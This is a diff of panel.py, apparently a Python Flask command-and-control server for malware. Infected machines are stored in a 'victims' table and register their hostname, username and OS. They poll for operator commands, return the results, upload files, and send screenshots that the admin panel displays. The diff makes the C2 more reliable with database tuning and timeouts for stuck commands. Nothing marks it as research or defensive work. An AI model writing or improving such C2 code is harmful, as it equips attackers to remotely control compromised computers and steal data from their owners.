@@ -1,8 +1,4 @@
 # language: Python 3.11+, file: panel.py
-# deps: flask, gunicorn
-# env:  PANEL_TOKEN, PANEL_USER, PANEL_PASS, PORT (опц.)
-# run:  gunicorn -b 0.0.0.0:$PORT panel:app
-
 import os, sqlite3, time, secrets, uuid
 from flask import Flask, request, g, Response, redirect, render_template_string, send_from_directory
 
@@ -14,20 +10,23 @@ ONLINE_SEC = 90
 UPLOAD_DIR = "uploads"
 
 os.makedirs(UPLOAD_DIR, exist_ok=True)
-
 app = Flask(__name__)
 
 def db():
     if "_db" not in g:
-        g._db = sqlite3.connect(DB_PATH)
+        g._db = sqlite3.connect(DB_PATH, timeout=20)
         g._db.row_factory = sqlite3.Row
+        try:
+            g._db.execute("PRAGMA journal_mode=WAL;")
+            g._db.execute("PRAGMA busy_timeout=10000;")
+        except:
+            pass
     return g._db
 
 @app.teardown_appcontext
 def close_db(e):
     d = g.pop("_db", None)
-    if d:
-        d.close()
+    if d: d.close()
 
 def init_db():
     with sqlite3.connect(DB_PATH) as c:
@@ -53,46 +52,42 @@ def admin_ok():
 
 @app.post("/api/register")
 def register():
-    if not auth_ok():
-        return ("", 401)
+    if not auth_ok(): return ("", 401)
     d = request.get_json(silent=True) or {}
-    if not d.get("id"):
-        return ("", 400)
+    if not d.get("id"): return ("", 400)
     now = int(time.time())
     with db() as c:
         c.execute("""INSERT INTO victims (id,hostname,username,os_info,ip,first_seen,last_seen)
                      VALUES (?,?,?,?,?,?,?)
                      ON CONFLICT(id) DO UPDATE SET
-                       last_seen=excluded.last_seen,
-                       hostname=excluded.hostname,
-                       username=excluded.username,
-                       os_info=excluded.os_info,
-                       ip=excluded.ip""",
-                  (d["id"], d.get("hostname", ""), d.get("username", ""),
-                   d.get("os", ""), request.remote_addr or "", now, now))
+                       last_seen=excluded.last_seen, hostname=excluded.hostname,
+                       username=excluded.username, os_info=excluded.os_info, ip=excluded.ip""",
+                  (d["id"], d.get("hostname",""), d.get("username",""), d.get("os",""),
+                   request.remote_addr or "", now, now))
     return {"ok": True}
 
 @app.get("/api/poll")
 def poll():
-    if not auth_ok():
-        return ("", 401)
+    if not auth_ok(): return ("", 401)
     vid = request.args.get("id")
-    if not vid:
-        return ("", 400)
+    if not vid: return ("", 400)
+    
+    now = int(time.time())
     with db() as c:
-        c.execute("UPDATE victims SET last_seen=? WHERE id=?", (int(time.time()), vid))
-        row = c.execute(
-            "SELECT id,cmd FROM commands WHERE victim_id=? AND finished=0 ORDER BY id LIMIT 1",
-            (vid,)).fetchone()
+        c.execute("UPDATE victims SET last_seen=? WHERE id=?", (now, vid))
+        # Сбрасываем зависшие команды (висят больше 60 секунд)
+        c.execute("UPDATE commands SET result='[timeout]', finished=1 WHERE victim_id=? AND finished=0 AND issued < ?",
+                  (vid, now - 60))
+                  
+        row = c.execute("SELECT id,cmd FROM commands WHERE victim_id=? AND finished=0 ORDER BY id LIMIT 1",
+                        (vid,)).fetchone()
     return {"id": row["id"], "cmd": row["cmd"]} if row else {"id": 0, "cmd": None}
 
 @app.post("/api/result")
 def result():
-    if not auth_ok():
-        return ("", 401)
+    if not auth_ok(): return ("", 401)
     d = request.get_json(silent=True) or {}
-    if not d.get("id"):
-        return ("", 400)
+    if not d.get("id"): return ("", 400)
     with db() as c:
         c.execute("UPDATE commands SET result=?, finished=1 WHERE id=?",
                   (d.get("result", ""), d["id"]))
@@ -100,13 +95,10 @@ def result():
 
 @app.post("/api/upload")
 def upload():
-    if not auth_ok():
-        return ("", 401)
-    if 'file' not in request.files:
-        return {"error": "no file"}, 400
+    if not auth_ok(): return ("", 401)
+    if 'file' not in request.files: return {"error": "no file"}, 400
     f = request.files['file']
-    if f.filename == '':
-        return {"error": "no filename"}, 400
+    if f.filename == '': return {"error": "no filename"}, 400
     filename = f"{uuid.uuid4().hex}_{os.path.basename(f.filename)}"
     filepath = os.path.join(UPLOAD_DIR, filename)
     f.save(filepath)
@@ -157,8 +149,8 @@ button:hover{background:#363}
 
 <h3>commands</h3>{% for c in cs %}<pre>[{{ c.id }}] {{ c.cmd }}
 {% if not c.finished %}[pending]
-{% else %}{% if c.result.startswith('data:image/jpeg;base64,') %}
-<img src="{{ c.result }}" style="max-width:100%; border:1px solid #333;">
+{% else %}{% if c.result.startswith('[+] Screenshot: ') %}
+<img src="{{ c.result.replace('[+] Screenshot: ', '') }}" style="max-width:100%; border:1px solid #333;">
 {% else %}{{ c.result }}{% endif %}{% endif %}</pre>{% endfor %}
 <meta http-equiv=refresh content=5>"""
 
